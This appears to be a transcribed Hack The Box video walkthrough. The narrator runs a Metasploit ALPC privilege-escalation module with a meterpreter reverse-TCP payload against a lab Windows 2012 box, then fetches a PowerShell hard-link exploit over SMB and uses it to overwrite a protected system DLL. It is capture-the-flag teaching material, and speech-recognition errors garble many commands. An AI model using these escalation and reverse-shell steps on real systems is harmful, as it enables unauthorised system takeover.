Metasploit or at least do a proof of concept without it so let's just search a LPC and hope my box is fully up-to-date it is disclose your date 827 so we should be able to just use this show options set sash - one this says windows 10 x64 so hopefully windows 2012 works we run we injected exploit finished and let's see did just give us admin or is it gonna send us another payload I'm guessing it sends us another payload because that was a VM going to sleep we're listing on a IP but that is not the correct one so let's set L host to be 10 10 14 17 and try this again I Hamlet failed to bind jobs we can set L port to be nine thousand five run it there we go exploit finished it's waiting for it to complete and no session was created so let us send another shell and we'll try this exploit again it's definitely a little picky and I think if it's been used before it may not work twice in a row so I don't know what state the box is in and we'll set the payload to be Windows meterpreter reverse TCP show options there we go run this again and exploits finished there we go sessions to but I should tell my phone on silent there we go sessions that was a payload coming in from this history let's show options again set session to two and try running this again and doesn't look like we get a call back I'm gonna revert the box and try this again and if it doesn't work then then we'll just assume this exploit doesn't work on Windows 2012 the box has been reverted in my meterpreter sessions have died so let's go back and send another email get another meterpreter session and try this ALDC exploit for one last time there we go we got a third meterpreter session those two sessions - I three know we just oh crap I exited it's been a long day so let's get mature procession number four I meant to background that and typed exit silly there we go session four is opened this time I'm just gonna set session before show options and let's run this and hope it works exploit finished and no session was created it's weird but sometimes this works sometimes it doesn't I'm not actually sure if this was ported to 2012 I heard it was but looks like it's having issues so instead let us just go and dig into how this exactly works and I'm going to lean to this end Metasploit so we'll just do sessions - I for upload powershell powershell shell and go grab the exploit for that one I'm going to Google what is it one logical myth zero day PowerShell and this guy is a hack the boxer he created a few machines I believe I forget exactly what his handle is but he's got this grip a video of it working and essentially the a LPC exploit allows for overwriting a file that you can read but not write to as the system user so if the file is protected by trusted installer you won't be able to overwrite it or if the you don't have read access over the file you won't be able to override it but if you have read access of the file and it's writable by system then you can overwrite it and potentially get a code execution so let us just grab a example not ps1 not grab it but look at it so all we do is call exploit ps1 target file target and then that is going to give us write access so this Mon ability is a hard linking vulnerability inside of it's abusing that we can write a task because I think we can write in to see : windows / tasks it's been a while since I looked into this but if we read a hard link into there we can get it to execute code a system essentially so let's see so we make the hard link and if the hard link fails exploit failed unable to create hard link and if it succeeds here is the dackel this is the file permission we create a schedule a service connect get folder and change the file permissions to this I'm sorry I haven't really looked over this exploit much I know how it works other than just how to abuse it so we'll just abuse it and call it a day so open a new window let's go to SMB v exploit ps1 paste this in also we don't have to do set paste as soon as I started pasting and realize I forgot to do set pace like all this gonna be bad but nope it's fine and let's download it somewhere so do CD users Nico and we can do X copy 10 10 14 17 slash testers exploit ps1 and then we want to find a file we want to overwrite so let us just go into sequel in Windows and let's see where he was exploiting because they over wrote a printer driver and then when you do file print it loads a DOL to display that window and that's where the exploit came in so we're going to give it to a path that is similar to this and XP again we just won't be able to fully exploit it but let's see example about ps1 so sequin windows system32 driver store a file repository so let's copy this and the folder is not PR NM s 0 0 3 its 0 0 1 on XP so CD 7 32 0 0 1 star PWD we're in a folder and then it's overwriting amd64 print config that DLL we don't have that let's just pick mxd wdui DOL because we do i cackles against that mxdw DUI dot dll what i cattles probably type out that name paste I did not wise I cackles not working I'm not exactly sure hi cackles I don't know how to get file permissions in PowerShell so we're just gonna trust that trust above install doesn't own that so we'll try to echo nothing to that filename and we get an error message saying we don't have access to that path so if we go back into users nico that we put it yep and do dot slash exploit ps1 - target and then specify the path so copy this and then copy the DLL named exploit successful it says we can now modify this file so let's go in here and then we can echo nothing over top of this DLL we didn't get an error message this time and if we do dir we can see it's length is now six versus before it was 31,000 so we have successfully overwritten this tol with just nothing and that is how the exploit works so you can dig into all those files and figure out how it works more or just call it a day like I did so unfortunately I'm out of time for this video so we're gonna call it for the week and I will see you all next week